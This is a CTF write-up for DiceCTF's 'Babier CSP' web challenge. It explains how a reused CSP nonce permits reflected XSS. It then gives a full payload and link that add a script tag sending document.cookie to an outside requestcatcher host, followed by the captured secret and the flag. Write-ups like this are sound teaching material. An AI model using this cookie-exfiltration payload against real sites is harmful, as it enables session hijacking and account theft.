# DiceCTF-Writeup
# Babier CSP Challenge by notdeghost
[TL;DR at the bottom](#tldr)
## Getting XSS
When you visit the [challenge website](https://babier-csp.dicec.tf/) you are welcomed by a link with the name 'View Fruit'.
When clicked, it adds the get paramater ?name to the url with the value of a random Fruit.

The `name` value is just echoed back into the sites html. The challenge description also tells you, that your objective is to steal the admins
cookies which greatly hints towards a cross site scripting attack (XSS) -- So let's do that!

When you try to access `<site>?name=<script>alert(1)</script>` , nothing happens though. If you have a look at the main sites html using burp to intercept to
the request, you see that, the "View Fruit" link works with javascript and it has a nonce value set!

![Burp request intercept](https://github.com/the-lightstack/DiceCTF-Writeup/blob/main/burp_babier_csp.png)

Now let's add this nonce to our payload:
`https://babier-csp.dicec.tf/?name=<script nonce="LRGWAXOY98Es0zz0QOVmag==">alert(1)</script>`
(From now on I will just show you the payload, not the full url)

An alert box pops up and the XSS worked!

## How to steal the Cookie

This is the part I struggled with.
The main idea is to add the cookies (found in `document.cookie`) to a get request to a service you can inspect the requests arriving.
I decided to go with [requestcatcher](https://requestcatcher.com/).
If we try to fetch a get request out of the browsers debug console from the target website to our bin, nothing arrives and fetch returns "rejected".

Now was the time I had a look into the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) (content security policy), which from my understanding tells the browser who it may make get requests to out of the websites context.

For the challenge website this header is set to following:
`Content-Security-Policy: default-src none; script-src 'nonce-LRGWAXOY98Es0zz0QOVmag==';`

This means first disallow every outgoing request and only allow requests for a script source, if the script has the nonce value = <nonce-value> set.

So we may fetch a script source to where ever we want to!

```html
</h1>                                             <= close open h1 tag from site html
<script nonce="LRGWAXOY98Es0zz0QOVmag==">         <= open script tag with nonce value so it executes
var head=document.getElementsByTagName('head')[0];<= get a reference to the html head element on the page
var script= document.createElement('script');     <= create a new script tag
script.src= ('https://givemeflag.requestcatcher.com/?flag='.concat(JSON.stringify(document.cookie))); <= setting the new script-tags src to our requestcatcher
                                                                                                          with the cookies appended as a get parameter
script.nonce="LRGWAXOY98Es0zz0QOVmag==";          <= setting the new script tag`s nonce so it will execute too
head.appendChild(script);                         <= finally appending it to the documents head, which will automatically execute it
</script>
</h1>
```

When the our new script tag is then executed, it want's to and is allowed to request it's "source" which in fact is our requestbin and we after we send the following link to the bot, a GET request will pop up in our bin.
Link: `https://babier-csp.dicec.tf?name=</h1><script nonce="LRGWAXOY98Es0zz0QOVmag==" >var head=document.getElementsByTagName('head')[0]; var script= document.createElement('script');script.src= ('https://givemeflag.requestcatcher.com/?flag='.concat(JSON.stringify(document.cookie)));script.nonce="LRGWAXOY98Es0zz0QOVmag==";head.appendChild(script);</script></h1>`

The incoming request:
![Request](https://github.com/the-lightstack/DiceCTF-Writeup/blob/main/request_catcher_request.png)

So the GET request we caught 
`GET /?flag=%22secret=4b36b1b8e47f761263796b1defd80745%22 HTTP/1.1`
reveals "4b36b1b8e47f761263796b1defd80745" to be our token. 

If we have a quick look into the index.js source code we could download from the diceCTF website, this part 

```js
app.use('/' + SECRET, express.static(__dirname + "/secret"));
```
reveals how to move on.
Let's plug our token into the url like so `/4b36b1b8e47f761263796b1defd80745`

The new pages source code:
```

I'm glad you made it here, there's a flag!

<b>dice{web_1s_a_stat3_0f_grac3_857720}</b>

If you want more CSP, you should try Adult CSP.

```
Hey!
`dice{web_1s_a_stat3_0f_grac3_857720}` is our flag!
<br>

## TL;DR
Add nonce value to script tag and fetch script src with cookie appended to circumvent the CSP.
<br>
Thanks for reading and hope you learned something new,<br>
LightStack<br>




